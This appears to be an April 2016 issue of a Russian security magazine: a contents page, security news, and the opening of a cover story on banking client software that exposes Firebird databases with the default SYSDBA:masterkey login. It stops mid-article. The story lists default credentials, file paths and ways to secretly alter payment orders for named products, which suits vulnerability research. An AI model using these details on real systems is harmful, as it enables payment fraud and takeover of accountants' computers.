                                                                 АПРЕЛЬ 2016


                №207


   Решаем
   CrackMe
   при помощи
    Microsoft Z3Py

    Разбираемся,
    как устроен
    Blockchain

   Делаем свой
     IoT на Android
   и хардкорном
   железе





     Cover
     Story





               ДИСТАНЦИОННОЕ БАНКОВСКОЕ ОГРАБЛЕНИЕДБО
                                            апрель 2016
          № 207





  MEGANEWS
Всё новое за последний месяц

  ДБО
Дистанционное банковское ограбление

  Борьба со склерозом
Извлекаем пароли из популярных программ

  Вечный сид
Как раздавать и скачивать торренты без следов

 WWW2
Интересные веб-сервисы

  Криптографическая народная республика
Как Blockchain победит бюрократию (или нет)

  Дайджест новостей за месяц
Android N, CyanogenMod 13, iOS 9.3, маленький iPhone и многое другое

  Робот на поводке
Управляем смартфоном с компа

  Android N: десктоп, энергосбережение и гибридный компилятор
Колонка Евгения Зобнина

  Карманный софт
Выпуск #18. Сетевые инструменты

  Кодинг на ходу
Программируем и администрируем, используя iOS

  Android и шифрование данных
О том, как все плохо и почему вряд ли станет лучше

  Easy Hack
Хакерские секреты простых вещей

  Обзор эксплоитов
Анализ свежих уязвимостей

  Роутер под угрозой
Старое развлечение на новый лад: массовый брут SSH

  Microsoft ломает проги
Учимся решать crackme при помощи Microsoft Z3Py

  Рынок безопасности
Колонка Александра Полякова

  Погружение в крипту
Часть 3: отечественные шифры

  X-TOOLS
Софт для взлома и анализа безопасности

  Тест бесплатных антивирусов, часть 2
Изучаем Comodo, Qihoo 360, Panda и Windows Defender

  Как я заражал Windows
Испытываем базовую устойчивость Win 7 и Win 10 к малвари

  Малварь для банкомата
Колонка Дениса Макрушина

  Разбираем Google Cloud Messaging
Экономим батарею и нервную ткань с помощью Push-уведомлений

  Твой первый интернет вещей
Учимся делать свой IoT на Android и хардкорном железе

  Сердце робота
Используем системный API Android в личных целях

  Стартапы и гиганты
Где лучше работать программисту

  Задачи на собеседованиях
Задачи от компании ABBYY

  Тур по BSD
OpenBSD, OpenSSH и Тео де Раадт

  Приручаем Сфинкса
Прикручиваем CMU Sphinx к Linux

  Облачный офис: удар по MS Office 365
Офис в облаках и на личных серверах

  Adversus ea consul respondit
Знакомимся с системой обнаружения сервисов Consul

  Все свое
Выбираем инструменты для походного набора

  FAQ
Вопросы и ответы

  Титры
Кто делает этот журнал
                                         Мария «Mifrill» Нефедова
                                                       nefedova.maria@gameland.ru

ФБР УСПЕШНО
ВСКРЫЛО IPHONE
ТЕРРОРИСТА БЕЗ
ПОМОЩИ APPLE

           марте, после долгих препирательств, наконец был завершен кон-
          фликт между Apple и ФБР по поводу iPhone террориста из Сан-Бер-
          нардино. В этом ФБР помог анонимный хакер, утверждавший, что
          способен извлечь данные без помощи разработчиков iOS
         О неизвестном «благодетеле» стало известно из документов,
 полученных судом незадолго до очередного слушания по этому делу. «В вос-В
 кресенье, 20 марта 2016 года, независимая сторона продемонстрировала
 ФБР возможный метод разблокирования iPhone Сайеда Фарука, — говорится
 в документе, направленном в суд. — Необходимо проверить, действительно
 ли этот метод действует и не повредит ли он данные на iPhone Фарука. Если он
  действует, необходимость в помощи Apple исчезнет».
    Конфликт начался в феврале, когда ФБР объявило о проблеме с обходом
 защиты телефона одного из террористов. Чтобы разблокировать устройство,
 нужно угадать пароль, состоящий из четырех десятичных цифр. Проблема за-
 ключается в том, что данные окажутся недоступны, если ввести неверный па-
 роль более десяти раз.
  ФБР потребовало у Apple разработать и установить на телефон террориста
специальную версию iOS, которая не ограничивает количество попыток. Мно-
гие полагают, что телефон террориста был всего лишь поводом. «Речь не об
одномтелефоне,ионисамипонимают,чтоэтотак,— объяснял глава Apple Тим
Кук в интервью журналу Time. — Весь смысл этого дела в том, чтобы создать
прецедент». Подобного же мнения придерживается и Стив Возняк: «Дважды
за свою жизнь я писал вещи, которые могли быть вирусами. Я избавился от
каждого бита этих исходных кодов. Это опасные, опасные вещи, и если в про-
дуктеAppleпоявилсякод,которыйпозволитлюдямпроникнутьвнутрь,плохие
люди с большой вероятностью найдут способ до него добраться».
   Название подрядчика, который в итоге помог взломать iPhone, остается
неизвестным. Главный «подозреваемый» — израильская компания Cellebrite,
которая специализируется на разработке программных средств и оборудова-
ния для извлечения данных из мобильных устройств. Эту версию подкрепляет
запись в американской федеральной информационной системе госзакупок,
согласно которой ФБР заключило с Cellebrite контракт на сумму не менее 15
278 долларов. Запись в базе и заявление об альтернативном методе разбло-
кирования iPhone датируются одним и тем же днем.
   Любопытно, что американское управление по борьбе с наркотиками поль-
зовалось услугами Cellebrite всего за две недели до начала конфликта между
  Apple и ФБР, причем почти с той же целью: компания помогала вскрыть запа-
 роленный iPhone наркоторговца. Вряд ли в ФБР не знали о существовании та-
  кой возможности, так что, если в ФБР и пытались создать прецедент, решение
 о привлечении Cellebrite означает капитуляцию.
    Неизвестным остается и метод взлома. Правдоподобнее всего выглядит
  теория, согласно которой для взлома iPhone применялось так называемое
 зеркалирование флеш-памяти. Скорее всего, содержимое накопителя сохра-
 нили при помощи программатора, а затем восстанавливали из резервной ко-
 пии всякий раз, когда попытки перебора пароля оказывались исчерпаны.
    Директор ФБР Джеймс Коми счел необходимым опровергнуть эту версию,
  объявив, что обмануть iOS зеркалированием флеш-памяти невозможно. По
  его словам, метод, который использует ФБР, не требует отпаивать микросхе-
 му накопителя и подключать к ней программатор: взлом происходит на уровне
  софта. В ответ известный специалист по криминологической экспертизе iOS
 Джонатан Здзиарски продемонстрировал, что на взломанном iPhone для сбро-
 са счетчика неудачных попыток достаточно перезаписать пару файлов. Без
 джейлбрейка это труднее, но результат останется тем же. Таким образом, зер-
 калирование рано сбрасывать со счетов.
   В любом случае, какой бы метод взлома ни был использован, ФБР подтвер-
  дило, что он действительно работает. Помощь Apple не понадобилась, и, по-
  скольку повода для претензий к компании больше нет, спецслужбы приняли
 решение отказаться от продолжения судебной тяжбы.



                   «Самая серьезная проблема с интер-Новости                    нетом — это анонимность. Все тактично
                     молчат [об этом]. Если кто выступит про-
                       тив анонимности, того тут же растерзают.Никольский/РИА                  Но процесс деанонимизации идет. Вот
Алексей                   Facebook следит, чтобы пользователь
                   был под своим именем. Если ты будешь
                    не под своим именем и кто-то по этому
                     поводу на тебя пожалуется в соцсеть,
                    модераторы заблокируют тебя».

                                                                                   Герман Клименко,
                                      советник президента РФ по вопросам интернета
ИССЛЕДОВАТЕЛЬ
ЗАСТАВИЛ
КОМПЬЮТЕР
ИЗЛУЧАТЬ
РАДИОВОЛНЫ
          езависимый эксперт Уильям Энтрикен (William Entriken) создал очень
          интересную вещь: C-библиотека, получившая имя System Bus Radio,
          способна заставить любой компьютер вещать на радиочастоте,
         даже если на машине нет никакого специального оборудования
          для этих целей. Метод Энтрикена пока находится на стадии ранне-
  го прототипа, но определенно может использоваться для извлечения данныхН
 с изолированных от внешнего мира компьютеров.
    В своих опытах исследователь умышленно обходится без усилителей, на-
  правленных антенн и иного специального оборудования: ресивером выступа-
  ет обычный Sony STR-K670P, а мелодию на частоте 1580 кГц AM проигрывает
  Macbook. Исполнение кода System Bus Radio заставляет процессор излучать
  электромагнитные волны, мощности которых хватает, чтобы «перебороть»
  экранирование и вещать вовне, пусть пока на весьма незначительное рассто-
  яние (порядка двух метров).
    Энтрикен отмечает, что частота может варьироваться в зависимости от дис-
  танции передачи и железа, на базе которого работает ПК. Также он сообщил,
  что вещать на радиочастотах способен любой компьютер, хотя уровень сигна-
  ла будет разным, в зависимости от комплектующих. Применение направлен-
  ной антенны, по словам исследователя, позволит увеличить дистанцию в три
  раза.
    Исходный код System Bus Radio опубликован на GitHub. Так как для продол-
  жения работы над проектом Энтрикену нужно как можно больше данных, мож-
  но не только протестировать System Bus Radio на своей машине, но и поде-
  литься затем результатами с исследователем.




                   «Все зависит от Apple. Если они когда-
                   нибудь выпустят хороший компьютер, мы
                  сделаем это [добавим Oculus Rift поддерж-
                       ку Mac]. Дело в том, что производительные
               GPU не являются приоритетом для Apple.
                Можно купить Mac Pro за 6000 долларов,instagram.com/catalystcreativ                    в нем будет AMD FirePro D700, но даже
                     этого недостаточно для наших рекоменду-
                  емых требований»

                                                        Палмер Лаки, один из сооснователей
                                                          компании Oculus VR
ОБНАРУЖЕН
ПЕРВЫЙ РАБОЧИЙ
ТРОЯН-ВЫМОГАТЕЛЬ
ПОД OS X

         азличные шифровальщики-вымогатели прочно занимают лидирующие
         позиции среди самой актуальной малвари последнего времени. Устрой-
          ства компании Apple эта беда долгое время обходила стороной, но в ав-
          густе эксперты Palo Alto Networks сообщили, что обнаружен вымогатель
          KeRanger, предназначенный для заражения машин на базе OS X.
    Вредонос сначала обнаружили сами пользователи, которые и обратили наР
 проблему внимание экспертов. Злоумышленники добавили KeRanger в состав
  Transmission 2.9 для Mac и разместили «новую версию» приложения на офи-
циальном сайте. Как именно хакерам удалось проделать данный трюк, пока
неизвестно, но, поскольку Transmission — опенсорсное приложение, внедрить
в него малварь наверняка было не самой сложной задачей.
   KeRanger является копией некоего шифровальщика для Windows- и Linux-у-
стройств и шифрует данные с помощью алгоритма AES, нацеливаясь более
чем на 300 различных расширений, в числе которых документы, файлы изо-
бражений, архивы, исходные коды, письма, сертификаты, базы данных и мно-
гое другое. Зловред требует у своих жертв выкуп в размере одного биткойна
(порядка 400 долларов). Исследователям также удалось обнаружить пока не
работающую функцию шифрования бэкапов Time Machine, что сделало бы ин-
формацию из резервных копий недоступной. Еще одна пока неактивная функ-
ция должна позволить атакующим исполнять на пораженном устройстве про-
извольный код, играя роль полноценного бэкдора.
   Технически KeRanger не первая рансомварь, направленная против поль-
зователей Apple: еще в 2014 году специалисты «Лаборатории Касперского»
обнаружили вредонос FileCoder. Однако FileCoder не функционировал долж-
ным образом. Также в 2015 году бразильский исследователь создал proof-of-
concept малварь под названием Mabouia. Mabouia работала исправно, но так
и не стала достоянием широкой публики.


СКОЛЬКО БОТОВ В ИНТЕРНЕТЕ?

   Аналитики компании Distil Networks, которая занимается обнаружением и изучением ми-
грации ботов в Сети, представили годовой отчет об активности ботов в интернете. Оказалось,
что в сравнении с предыдущим годом количество трафика, генерируемого людьми, возросло.
Люди снова обошли роботов по степени активности.

В 2015 году 46% всего трафика          В 2015 году люди превзошли ботов
в интернете генерировали боты.          числом и были ответственны за 54,3%
18% из них оказались                     всего сетевого трафика. Еще в 2014
вредоносными.                           году людей насчитывалось 40,9%.


Современные вредоносные боты способны на разные трюки
53% могут загружать JavaScript
39% могут имитировать людей и взаимодействовать с веб-страницами
73% ботов подменяют IP-адреса
36% способны подменить user agent
 РОСКОМНАЗДОР
 ПОДДЕРЖАЛ
ШТРАФЫ ЗА ОБХОД
 БЛОКИРОВОК
               марта 2016 года Роскомнадзор провел круглый стол, посвя-
              щенный проблемам борьбы с пиратством в целом и поправкам
                   к антипиратскому закону в частности. Напомним, что правооб-
                ладатели предложили значительно упростить процедуру бло-
                кировки «зеркал» запрещенных сайтов, а также штрафовать за
  пропаганду средств для обхода блокировок. Именно эта инициатива и была17
  главной на повестке дня.
  По итогам круглого стола глава Роскомнадзора Александр Жаров сооб-
щил прессе следующее:
   «Существует условно документ, который можно назвать образно законопро-
ектом. <...> На данном этапе законопроект написан очень широко, к первому
чтению он примет свою окончательную форму.
  Наши предложения касаются блокировки зеркал, требования в течение трех
суток к поисковым системам об удалении сайтов, подпавших под вечную бло-
кировку на основании решения Мосгорсуда, и административной ответствен-
ности владельцев тех сайтов, которые пропагандируют пути обхода блокировок
с целью доступа к сайтам, содержащим пиратскую информацию».

                1 000 000 2000
      игр для Linux              сертификатов выдал
    доступно в Steam                     Let’s Encrypt

     Компания Valve сообщила, что                         Let’s Encrypt похвастался первы-
  в марте 2016 года платформа Steam            ми успехами. Проект объединенной
  преодолела важную отметку. Коли-                   Internet Security Research Group по
  чество игр для Linux в Steam значи-              предоставлению бесплатных SSL/TLS
  тельно возросло — теперь их более               -сертификатов всем желающим был
  двух тысяч. Для сравнения: игр для              запущен всего три месяца назад и
  OS X насчитывается порядка трех                уже добился значительных результа-
   тысяч, а операционную систему                      тов. Разработчики сообщили, что за
  Windows поддерживают более вось-              первый квартал работы было выдано
  ми тысяч игр. Тем не менее, соглас-              более миллиона сертификатов и ин-
  но официальной статистике Valve,                 терес к сервису не ослабевает.
  игры для Linux интересуют лишь 1%
  пользователей платформы.
В GIT ОБНАРУЖЕНЫ
СЕРЬЕЗНЫЕ
УЯЗВИМОСТИ
           сследователь Лаэль Селье (Laël Cellier) обнаружил в серверной
          и клиентской части Git две опасные проблемы, которые затрагива-
          ют ветки 2.x, 1.9 и 1.7. В числе прочего баги представляют потен-
          циальную опасность для таких популярных ресурсов, как GitHub,
             Bitbucket, Gerrit и GitLab.
    Найденные баги могут привести к исполнению произвольного кода и пере-И
 полнению буфера. Для эксплуатации уязвимостей атакующему нужно создать
 репозиторий с деревом файлов с чрезвычайно длинными именами, а затем
 пушнуть его на уязвимый сервер (атака на сервер) или позволить уязвимому
 клиенту клонировать его из удаленного репозитория (атака на клиент).
    Первая найденная уязвимость инициирует выход за пределы выделенной
 памяти: функция strlen() при работе с излишне длинным именем файла может
 получить чересчур большое число, из-за чего значение получится отрицатель-
 ным, а не положительным и памяти, запрошенной xmalloc(), может не хватить для
  итоговой комбинированной строки. Но даже если исправить первую уязвимость,
  сработает вторая: длинные пути, множество поддиректорий и огромные имена
 файлов могут вызвать переполнение буфера (heap overwrite), из-за чего «лиш-
  няя» часть строки будет записана вне выделенного приложению объема памяти.
   В таких длинных путях запросто можно хранить данные (к примеру, вредо-
 носные пейлоады). Волноваться о том, что строка слишком длинная и «тяже-
  лая», не нужно: при передаче информации от сервера клиенту (и наоборот) Git
 сжимает данные, используя zlib, что распространяется и на имена файлов.
    Исследователь пожаловался, что проблеме не уделяют должного внима-
  ния, и сообщил, что, по его данным, баги не устранены ни в одном дистрибу-
  тиве Linux. Похоже, единственные, кто обновился своевременно, — это GitHub,
 а затем один из его главных конкурентов — GitLab. За свою находку Селье по-
  лучил от GitHub 5000 баллов по программе обнаружения уязвимостей.



                    «Подключенные к интернету системы ужеНовости                     повсюду, и эффект от них, в глобальном
                     смысле, очень значителен. Мобильная
                    малварь — не такая большая проблема,Никольский/РИА                     потому как мобильные устройства — это
Алексей                    просто маленькие компьютеры. Но те-
                    перь стало возможно атаковать домаш-
                    ние роутеры, термостаты и холодильни-
                          ки, а затем использовать их для усиления
                         атак. Все это дешевые, примитивные
                     с точки зрения инженерии вещи, которые
                      несут нам множество рисков».

                                                                         Брюс Шнайер,
                                  криптограф, писатель и специалист по безопасности
ВЫМОГАТЕЛЬ
«ПЕТЯ» БЛОКИРУЕТ
ЗАГРУЗКУ ОС
И ТРЕБУЕТ ВЫКУП

         недавнем прошлом локеры (они же блокировщики) были очень рас-
          пространенным типом малвари. Некоторые из них блокировали ра-
          бочий стол, другие только окно браузера, но все они требовали от
          жертвы выкуп за восстановление доступа. На смену локерам при-
         шли шифровальщики, которые не просто блокируют данные, но и
 шифруют их, что значительно повышает вероятность оплаты выкупа.В
    Специалисты компании G DATA обнаружили свежий образчик локера, ко-
 торый называет себя Petya. В сообщении с требованием выкупа малварь за-
являет, что сочетает в себе функции блокировщика и шифровальщика разом.
При этом Petya блокирует не только рабочий стол или окно браузера, он вооб-
ще предотвращает загрузку операционной системы. Сообщение с требова-
нием выкупа гласит, что малварь использует «военный алгоритм шифрования»
и шифрует весь жесткий диск сразу.
   Petya преимущественно атакует специалистов по кадрам. Для этого зло-
умышленники рассылают фишинговые письма — резюме от кандидатов на
какую-либо должность. К письмам прилагается ссылка на полное портфолио
соискателя — файл, размещенный на Dropbox. Разумеется, вместо портфолио
по ссылке располагается малварь.
   Запуск этого exe-файла приводит к падению системы в «синий экран смер-
ти» и последующей перезагрузке. После перезагрузки компьютера жертва
видит имитацию проверки диска (CHKDSK), по окончании которой на экране
компьютера загружается не операционная система, а экран блокировки Petya.
   Специалисты G DATA пишут, что, к счастью, вредонос попросту врет о шиф-
ровании данных: на самом деле шифруется только MBR (главная загрузочная за-
пись) и MFT (главная файловая таблица), то есть разметочная информация о рас-
положении файлов на диске. Сами файлы при этом остаются нетронутыми и могут
быть восстановлены с помощью различных средств восстановления дисков.



ОСНОВНЫЕ ТРЕНДЫ И ЦЕЛИ ВЫМОГАТЕЛЬСКОГО ПО

   В наши дни один из наиболее популярных способов заработка в среде киберпреступни-
ков — это вымогательская малварь. Новые образчики таких вредоносов появляются буквально
каждый день. В этой области есть свои лидеры и признанные фавориты. Аналитики компании
Fortinet изучили тему и представили отчет о самых популярных шифровальщиках и их работе.

Исследование Fortinet выявило три топовых вымогателя:
CryptoWall, TeslaCrypt и Locky.
Суммарно зловреды пытались связаться с C&C-серверами 18,6 миллиона раз




83,4% CryptoWall                                                   16,5% Locky   0,08% TeslaCrypt
Вымогатель Locky             0%     10%    20%    30%    40%    50%    60%
в основном атакует          US
пользователей из США,                               FR
Франции и Японии.                                 JP
                             SK
                             CA
                          MX
                               CL
                          GB
                               ZA
                                               IL

Вымогатель CryptoWall        0%  5%  10%  15%  20%  25%  30%  35%  40%  45%
преимущественно ата-       US
кует пользователей из                                           IP
США, Японии и Турции.                               TR
                              ES
                          MX
                                               IL
                                                IT
                             CA
                          CO
                               FR

TeslaCrypt, в свою оче-         0%   5%   10%  15%  20%  25%  30%  35%  40%
редь, сосредоточен на        KR
атаках пользователей из                            US
Кореи, США и Турции.                               TR
                             CA
                                 JP
                                                IT
                                       IN
                              ES
                             DE
                          MX
BINDIFF ТЕПЕРЬ
БЕСПЛАТНЫЙ
               inDiff разработала компания Zynamics, которую еще в 2011 году при-
          обрела Google. До недавнего времени этот инструмент стоил 1700
          долларов, затем его цену снизили до отметки 200 долларов, а те-
          перь BinDiff вообще превратился в бесплатную утилиту, о чем офи-
          циально сообщил в своем блоге инженер компании Google Кристи-
 ан Бличманн (Christian Blichmann).B
     BinDiff используется для анализа и сравнения бинарников. Данная тулза
 весьма популярна (и совершенно заслуженно) у экспертов по информацион-
 ной безопасности и применяется для поиска малвари, анализа патчей и дру-
  гих похожих задач. BinDiff поддерживает архитектуры x86, MIPS, ARM/AArch64,
 PowerPC и другие. По словам Бличманна, в Google утилита задействована
 в масштабных задачах по поиску малвари и помогает защитить как внешних
 пользователей компании, так и ее персонал.
   Версия BinDiff 4.2 для Windows и Linux уже свободно доступна на офици-
альном сайте. Впрочем, стоит помнить о том, что для использования BinDiff
понадобится IDA Pro не ниже версии 6.8, а стоимость лицензии на IDA Pro на-
чинается от 589 долларов.

 25   20% 0-day-уязвимостей было          сотрудников готовы
  выявлено в 2015 году              продать свой
                              корпоративный пароль
       Аналитики компании Secunia предста-                     Одной из основных угроз в сфере корпо-
   вили годовой отчет о всевозможных уязви-                   ративного шпионажа по-прежнему остается
   мостях, обнаруженных за это время в раз-                   пресловутый человеческий фактор. Желая узнать
   личном ПО. Суммарно за 2015 год компания                 о проблеме больше, исследователи компании
   насчитала 16 081 уязвимость в 2484 продук-                      SailPoint провели анонимный опрос среди 1000
   тах 263 производителей. Лишь 2573 бага из                  сотрудников различных организаций из США, Ве-
   найденных не были устранены и не имели                    ликобритании, Франции, Австрии и Нидерландов.
   патчей на момент обнародования подробной                 Выяснилось, что 20% опрошенных готовы про-
   информации о них. Только такие уязвимости                  дать свои рабочие пароли третьим лицам. 44% из
   специалисты компании готовы считать 0-day,                 них даже не хотят торговаться и согласны усту-
   и только при условии, что для проблемы был                  пить данные за 1000 долларов. 65% респонден-
   создан работающий эксплоит. Таких уязви-                    тов признались, что используют рабочий пароль
   мостей насчитали всего 25 штук — ровно                     в других, не связанных с работой приложениях.
   столько же, сколько в 2014 году. Аналитики               32% без проблем сообщают свой пароль кол-
   оценили как «крайне критические» только                     легам. Иронично, но 85% опрошенных при этом
   0,5% всех обнаруженных багов.                               заявили, что не хотели бы стать жертвой утечки
                                                              данных.
ОБИЖЕННЫЙ
ПРОГРАММИСТ
СЛОМАЛ УСТАНОВКУ
ТЫСЯЧ ПРОЕКТОВ

        ерой этой истории — оклендский программист по имени Азер Кочулу,
        разработавший и опубликовавший более 250 модулей и утилит с от-
        крытыми исходниками. Именно с ним связался юрист компании Kik
        и попросил переименовать утилиту kik, которую Кочулу распространял
        через пакетный менеджер npm.Г
   Компания Kik занимается разработкой одноименного мессенджера для
мобильных телефонов. В декабре этот мессенджер насчитывал 240 миллио-
нов зарегистрированных пользователей. Компания утверждает, что им поль-
зуются более 40% жителей США в возрасте от 13 до 19 лет.
   Кочулу не стал переименовывать свой проект, но юрист Kik не сдавался.
Следующее письмо получил уже не Кочулу, а руководство компании, которая
поддерживает работу npm, и администраторы npm переименовали модуль kik
без разрешения автора. Кочулу был взбешен. «Язанимаюсьоткрытымиисход-
никами потому, что власть должна принадлежать людям», — публично заявил
он через Medium и с этими словами убрал из npm 272 своих пакета.
   Последствия оказались неожиданно значительными: на два с лишним
часа тысячи проектов вышли из строя. «Во вторник, 22 марта, около 14:30 по
тихоокеанскому стандартному времени мы стали фиксировать сотни оши-
бок в минуту, вызванных тем, что зависимые от этих модулей проекты, а за
ними — зависимые от зависимых и так далее не могли установить удаленные
пакеты», — описывали развитие событий администраторы npm. Никто не ожи-
дал, что инструменты, которые ежедневно используют тысячи разработчиков
и компаний, окажутся настолько хрупкими.
   Чтобы подобное не повторилось, администраторы npm планируют услож-
нить удаление пакетов. Собираются ли они при этом прислушиваться к мнению
разработчиков пакетов, неизвестно. Такое поведение доказывает, что Кочулу,
хоть и не был прав в своем решении удалить код, от которого зависят совер-
шенно невиновные в этой ситуации проекты, оказался точен в своей оценке
npm: «Эта ситуация заставила меня осознать, что npm — частное простран-
ство, где корпорации сильнее людей».
COVERSTORY





                                                                                      Евгений Соболев
                                                                                                           Practical Security Lab
                                                                                                      sobolev@itpsl.ru





                         ДИСТАНЦИОННОЕ
                          БАНКОВСКОЕ
                           ОГРАБЛЕНИЕ
ДБО
Добавляя в систему сертификаты, устанавливая и настраивая
криптопровайдеры, продираясь через дебри установки и на-
стройки клиент-банка, начинаешь думать, что его система
полностью продумана и безопасна. Ведь для защиты приме-
няются всевозможные токены, используются многофактор-
ные авторизации, антифрод-системы и прочее — в общем,
делается все, чтобы свести к минимуму вероятность несанк-
ционированного перевода денег клиента злоумышленника-
ми. Но, как показывает практика, этого не всегда бывает до-
статочно. Об одном таком случае и пойдет речь.

ГДЕ СОБАКА ЗАРЫТА
В прошлом номере мы рассмотрели, как некорректно настроенная СУБД (а на-
личие включенной дефолтной учетной записи с известными всем логином/
паролем и возможность доступа к серверу по сети трудно назвать коррект-
ной настройкой) может свести на нет все меры по разграничению доступа для
персонала. Мы убедились, что, даже не имея на руках никаких 0day-сплоитов,
не обладая никакими суперспособностями, практически любой человек, хоть
немного связанный с IT, может спокойно получить доступ в любую точку пред-
приятия или офиса (даже до кабинета гендира). Кто пропустил — рекомендую
ознакомиться, может быть когда-нибудь в жизни пригодится. Надо сказать, что
такой уязвимости оказались подвержены не только СКУД-системы, но и при-
ложения дистанционного банковского обслуживания.
   Речь о простой случайности/халатности, когда «толстый» клиент ДБО от-
крывает порт СУБД (Firebird) наружу. Зачем это нужно — не совсем понятно.
А еще меньше понятно, зачем разработчики оставляют стандартные логин
и пароль от этой базы данных неизменными. В результате клиенты открывают
счет в банке, устанавливают на компьютер бухгалтера клиент системы ДБО,
который открывает доступ к внутренней базе данных всем сотрудникам ком-
пании. Эти сотрудники могут внести любое изменение в БД, например под-
менить реквизиты счета ежемесячного платежного поручения, и, когда придет
время его оплатить, деньги компании уйдут не туда, куда планировалось. При
этом использование токенов и СМС-кодов подтверждения не спасает — бух-
галтер сам вставит токен и введет код из СМС, ведь он думает, что оплачива-
ет легальную платежку. И все это реализуется без использования банковских
троянов и не через интернет, не оставляет никаких следов и логов. Выяснить
потом, как это произошло и тем более кто это сделал, будет крайне сложно,
если вообще получится.
  Да и без модификации БД можно обойтись — через доступ к БД возможно
удаленно выполнять произвольные команды ОС с правами SYSTEM и захва-
тить компьютер бухгалтера целиком!
   Конечно, такая примитивная уязвимость свойственна не лидерам рынка
ДБО, а скорее мелким производителям и банкам, разрабатывающим системы
ДБО самостоятельно. Но это не уменьшает риски для клиентов и для самих
банков — ведь, по сути, это можно рассматривать как вину банка, а значит,
и требовать полную компенсацию ущерба от него.

ПОИСК УЯЗВИМЫХ КЛИЕНТОВ
Проверить наличие такой особенности в ДБО достаточно легко. Нужно уста-
новить клиентское приложение, выяснить, какая СУБД используется, и уз-
нать, доступна ли она по сети, попробовать перебрать стандартные пароли
(для Firebird это sysdba:masterkey). Проблема оказалась в другом — достать
экземпляр ДБО порой сложно, для этого нужно открывать счет в банке, где
он используется. А это время, формальности и обоснованные подозрения со-
трудников банка. Да и заводить десятки счетов на одну компанию не очень хо-
чется, а использовать подставные фирмы для этого трудоемко, особенно если
учесть, что коммерческой выгоды здесь никакой нет.
   Поэтому проверить все клиенты ДБО, которые хотелось, мне не удалось.
Но среди проверенных некоторые оказались уязвимы. Про них и будет речь.
Стоит, однако, учитывать, что у некоторых из этих систем есть версии с други-
ми СУБД, где исследуемая уязвимость отсутствует.

РЕЗУЛЬТАТЫ
Условно все рассмотренные системы можно разделить на два типа, в зависи-
мости от разработчика ПО:
•  ДБО, разработанные софтверной компанией. Внедряются в разные банки
   как готовое решение;
• ДБО собственной разработки. Используется только в конкретном банке.

Как понимаешь, первый вариант для злоумышленника представляет больший ин-
терес: при обнаружении уязвимости она затронет гораздо большее количество
банков, использующих ДБО конкретного вендора. Второй вариант не так стра-
шен, но тоже несет определенную опасность, хоть и для ограниченного круга лиц.
   Установив системы ДБО и проверив на наличие уязвимости, я обнаружил,
что ей подвержены:
•  две системы ДБО, разработанные софтверной компанией: банк-клиенты
  «ИНИСТ» и СФТ;
•  две системы ДБО собственной разработки банка: «ИК Банк» и Уралпром-
   банк.
Как я уже говорил, получение экземпляров ПО на тестирование — достаточно
сложная процедура, и проверить удалось далеко не все варианты, которые хо-
телось. Тем не менее к части недоступных вариантов получилось добыть доку-
ментацию, на основании которой можно сделать вывод, что эти системы также
с большой долей вероятности уязвимы (сюда относится OTP Bank Ukraina).
   Итак, у нас набрался, может быть, небольшой, но довольно разношерстный
список ДБО. Давай поговорим о каждом экземпляре поподробней. Начнем
с тех вариантов, которые были разработаны софтверными компаниями.

1. «ИНИСТ»
Разработка компании «ИНИСТ» доступна в двух версиях, в зависимости от
используемой СУБД. Уязвима версия с СУБД Firebird. Второй вариант, осно-
ванный на MS Jet Database Engine, лишен такого недостатка — никакие порты
наружу не торчат, а значит, в этом случае система устойчива к описываемым
воздействиям.


                                                     Внешний вид си-
                                                         стемы «ИНИСТ»





Ну а Firebird по старой доброй привычке открывает порт для всей локальной сети.


                                                       Открытый
                                                             в локальную
                                                                 сеть порт СУБД
                                                                         Firebird
Подключиться к нему можно с помощью утилиты IBExpert. Для этого в настрой-
ках подключения к базе указываем адрес удаленного сервера, протокол TCP/
IP, версию сервера Firebird 1.5 и файл базы данных C:\Program Files\INIST\
IBCRemote31\bcdb.fdb, логин и пароль по умолчанию SYSDBA:masterkey.
   Подключившись к БД, можно узнать любую информацию из банк-клиента
и даже подправить ее удаленно. Например, узнать хеш пароля от ДБО-клиента.


                                                    Хеш пароля от
                                                         ДБО-клиента





На вид формат хеша мне незнаком. Однако можно, покопавшись во внутрен-
ностях клиента ДБО, найти алгоритм его генерации и попробовать сбрутить.
Не исключаю, что он может оказаться обратимым, и тогда брутить ничего не
придется, получится сразу его узнать. Но это нужно проверять отдельно. Так-
же через БД можно смотреть документы, пересылаемые в банк и из банка,
и скрытно по сети модифицировать их.


                                                              Таблица,
                                                         хранящая
                                                          документы
Отдельно стоит упомянуть инструкцию по установке.


                                                           Инструкция по
                                                              установке ДБО
                                                     «ИНИСТ»


Хоть она и говорит, что нужно ввести стандартные логин и пароль для БД, тут
же упоминается о возможности сменить этот пароль позже. Вопрос в том, на-
сколько пользователи следуют инструкции на практике, ведь здесь смена па-
роля для SYSDBA не является обязательным шагом при установке клиента.
   Интересно, что документация по установке ДБО «ИНИСТ», распространяе-
мая банками, вообще ничего не говорит про возможность смены пароля, толь-
ко «нужно ввести sysdba и masterkey».

2. СФТ
Второй пациент, разработанный софтверной компанией, — банк-клиент СФТ.
Если просканировать Nmap’ом (или любым другим сканером сети) хост, на кото-
рый был установлен этот клиент, то среди открытых портов обнаружится 3050-
й TCP-порт, принадлежащий СУБД Firebird. Попытка подключиться к нему с по-
мощью стандартной учетной записи SYSDBA также увенчается успехом. Для
коннекта используются следующие параметры: версия сервера — Firebird 2.5,
файл базы данных — C:\SFT\BankClient7\<название организации>\Database\
work.mdf. Ну и плюс стандартная учетка SYSDBA:masterkey.


                                                     Внешний вид
                                                              банк-клиента СФТ
После получения доступа к внутренностям клиента в нашем распоряжении
оказывается все: аккаунты различных компаний, использующих его, все их
счета, документы и прочая интересная информация.





                                      Внутренности базы данных ДБО-клиента СФТ

Обнаружилась и очень интересная фишка — при установке клиента на экран
выводится пользователь и пароль для подключения к базе.





                                Логин и пароль для подключения к базе в plaintext’е
Вот так некоторые вендоры беспокоятся о безопасности пользователей свое-
го ПО. Ну а теперь давай рассмотрим, как обстоят дела у собственных разра-
боток банков.

3. «ИК БАНК»
Самописный банк-клиент «ИК Банка» также использует СУБД Firebird. Правда,
по умолчанию — embedded-версию Firebird, поэтому в таком варианте он не
светит неприкрытыми портами в сеть. В случае же установки сетевой версии
наш любимый баг (или фича) возвращается на свое место. Используя стан-
дартную комбинацию логин/пароль, мы опять попадаем внутрь базы данных и
можем вытворять все, на что только хватит фантазии.


                                                               Инструкция
                                                                по смене
                                                                пароля для
                                                                   пользовате-
                                                                 ля SYSDBA





  Для доступа к базе используются
следующие параметры: версия сер-
вера — Firebird 1.5, файл базы дан-
ных — C:\TIBCl3\CLB.FDB.
